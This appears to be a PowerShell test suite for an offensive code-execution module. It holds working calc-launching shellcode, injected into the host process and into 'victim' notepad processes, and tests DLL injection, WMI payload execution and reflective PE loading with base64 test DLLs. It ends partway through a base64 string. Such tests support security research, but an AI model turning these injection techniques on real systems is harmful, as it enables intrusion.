Set-StrictMode -Version Latest

$TestScriptRoot = Split-Path $MyInvocation.MyCommand.Path -Parent
$ModuleRoot = Resolve-Path "$TestScriptRoot\.."
$ModuleManifest = "$ModuleRoot\CodeExecution\CodeExecution.psd1"

Remove-Module [C]odeExecution
Import-Module $ModuleManifest -Force -ErrorAction Stop

Describe 'Invoke-Shellcode' {
	# 32-bit calc popping shellcode
	[Byte[]] $Shellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
								0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
								0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
								0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
								0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,
								0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,
								0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
								0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
								0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,
								0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,
								0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
								0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
								0x61,0x6c,0x63,0x00)

	# 64-bit calc popping shellcode
	[Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
								0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
								0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
								0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
								0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
								0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
								0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
								0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
								0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
								0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
								0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
								0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
								0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
								0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
								0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
								0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
								0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)

	$PowerShell32bit = $False
	$Shellcode = $Shellcode64

	if ([IntPtr]::Size -eq 4) {
		$PowerShell32bit = $True
		$Shellcode = $Shellcode32
	}

	$64BitOS = $False
	if ($Env:ProgramW6432) { $64BitOS = $True }

	# When launching notepad.exe, the bitness of the process needs to match that of powershell.exe
	if ($PowerShell32bit -and $64BitOS) {
		# 32-bit PowerShell on a 64-bit OS needs to launch Wow64 notepad
		$NotepadPath = "$($Env:SystemRoot)\SysWow64\notepad.exe"
	} else {
		$NotepadPath = "$($Env:SystemRoot)\System32\notepad.exe"
	}

	BeforeEach {
		# Kill all running instances of calc.exe or Calculator.exe (i.e. "modern" calc)
		Get-Process | Where-Object { $_.ProcessName -match '^[Cc]alc(ulator)?$' } | Stop-Process -Force
	}

	It 'should pop calc without arguments' {
		Invoke-Shellcode -Force

		Start-Sleep -Seconds 2
	}

	It 'should pop calc in host process with -Shellcode arg' {
		Invoke-Shellcode -Shellcode $Shellcode -Force

		Start-Sleep -Seconds 2
	}

	It 'should pop calc in victim notepad.exe process without -Shellcode arg' {
		$NotepadProc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $NotepadPath

		if ($NotepadProc.ReturnValue -ne 0) {
			throw 'Could not start victim process: notepad.exe'
		} 

		$VictimPID = $NotepadProc.ProcessId

		Invoke-Shellcode -ProcessId $VictimPID -Force

		Start-Sleep -Seconds 2

		Stop-Process -Id $VictimPID
	}

	It 'should pop calc in victim notepad.exe process with -Shellcode arg' {
		$NotepadProc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $NotepadPath

		if ($NotepadProc.ReturnValue -ne 0) {
			throw 'Could not start victim process: notepad.exe'
		}

		$VictimPID = $NotepadProc.ProcessId

		Invoke-Shellcode -ProcessId $VictimPID -Shellcode $Shellcode -Force

		Start-Sleep -Seconds 2

		Stop-Process -Id $VictimPID
	}

	AfterEach {
		# Validate that a calc process was launched by the shellcode

		$CalcProcs = Get-Process | Where-Object { $_.ProcessName -match '^[Cc]alc(ulator)?$' }
		$CalcCount = $CalcProcs | Measure-Object

		if ($CalcCount.Count -gt 0) {
			$CalcProcs | Stop-Process -Force
		}

		$CalcCount.Count | Should BeGreaterThan 0
	}
}

Describe 'Invoke-DllInjection' {
	$Advpack = 'advpack.dll'
	$AdvpackPath = "$($Env:SystemRoot)\System32\$Advpack"

	It 'should inject a known system DLL' {
		if (-not (Test-Path $AdvpackPath)) {
			throw "$AdvpackPath does not exist on disk."
		}
		
		$LoadedModule = Invoke-DllInjection -ProcessID $PID -Dll $AdvpackPath
		$LoadedModule | Should Not BeNullOrEmpty

		$LoadedModule -is [System.Diagnostics.ProcessModule] | Should Be $True
		$LoadedModule.ModuleName | Should Be $Advpack
	}

	It 'should not inject a non-existent DLL' {
		$NonExistentDllPath = 'C:\foo.dll'

		Test-Path $NonExistentDllPath | Should Be $False

		{ Invoke-DllInjection -ProcessID $PID -Dll $NonExistentDllPath } | Should Throw
	}

	It 'should not inject to a non-existent process' {
		{ Invoke-DllInjection -ProcessID 0 -Dll $AdvpackPath } | Should Throw
	}
}

Describe 'Invoke-WmiCommand' {
	$RegistryHive = 'HKEY_CURRENT_USER'
	$KeyPath = 'SOFTWARE\Microsoft\Cryptography\RNG'
	$RegistryKeyPath = "HKCU:\$KeyPath"
	$RegistryPayloadValueName = 'Seed'
	$RegistryResultValueName = 'Value'
	$ComputerName = 'localhost'
	$SamplePayload = { 1+1 }
	$SamplePayloadResult = & $SamplePayload
	$SamplePayloadResultType = $SamplePayloadResult.GetType()

	Context 'Successful code execution' {
		BeforeEach {
			# Ensure registry keys and values are cleaned up prior to execution
			Remove-ItemProperty -Path $RegistryKeyPath -Name $RegistryPayloadValueName -ErrorAction SilentlyContinue
			Remove-ItemProperty -Path $RegistryKeyPath -Name $RegistryResultValueName -ErrorAction SilentlyContinue
			Remove-Item -Path $RegistryKeyPath -ErrorAction SilentlyContinue
		}

		AfterEach {
			{ Remove-ItemProperty -Path $RegistryKeyPath -Name $RegistryPayloadValueName -ErrorAction Stop } | Should Throw
			{ Remove-ItemProperty -Path $RegistryKeyPath -Name $RegistryResultValueName -ErrorAction Stop } | Should Throw
			{ Remove-Item -Path $RegistryKeyPath -ErrorAction Stop } | Should Throw
		}

		It 'should execute a sample payload locally and clean up properly' {
			$Result = Invoke-WmiCommand -Payload $SamplePayload

			$Result | Should Not BeNullOrEmpty
			$Result.PayloadOutput -is $SamplePayloadResultType | Should Be $True
			$Result.PayloadOutput | Should Be $SamplePayloadResult
			$Result.PSComputerName | Should Be $ComputerName
		}

		It 'should execute a sample payload "remotely" (localhost) and clean up properly' {
			$Result = Invoke-WmiCommand -Payload $SamplePayload -ComputerName $ComputerName

			$Result | Should Not BeNullOrEmpty
			$Result.PayloadOutput -is $SamplePayloadResultType | Should Be $True
			$Result.PayloadOutput | Should Be $SamplePayloadResult
			$Result.PSComputerName | Should Be $ComputerName
		}

		It 'should execute a sample payload with explicit arguments locally and clean up properly' {
			$Result = Invoke-WmiCommand -Payload $SamplePayload -RegistryHive $RegistryHive -RegistryKeyPath $KeyPath -RegistryPayloadValueName $RegistryPayloadValueName -RegistryResultValueName $RegistryResultValueName
		
			$Result | Should Not BeNullOrEmpty
			$Result.PayloadOutput -is $SamplePayloadResultType | Should Be $True
			$Result.PayloadOutput | Should Be $SamplePayloadResult
			$Result.PSComputerName | Should Be $ComputerName
		}
	}

	Context 'Invalid arguments' {
		It 'should not process invalid registry hives' {
			{ Invoke-WmiCommand -Payload $SamplePayload -RegistryHive 'HKEY_FOO' -RegistryKeyPath $KeyPath -RegistryPayloadValueName $RegistryPayloadValueName -RegistryResultValueName $RegistryResultValueName } | Should Throw
		}
	}
}

Describe 'Invoke-ReflectivePEInjection' {
	# A bare bones test harness DLL that simply returns L"Hello, world!" upon having WStringFunc called
	# See https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
	$Encoded64BitWStringDll = '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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAACCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='
	$Encoded32BitWStringDll = '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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAADAAAABEwAAAAIAAADAAAABwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='

	# A bare bones test harness DLL that simply returns "Hello, world!" upon having StringFunc called
	$Encoded64BitStringDll = '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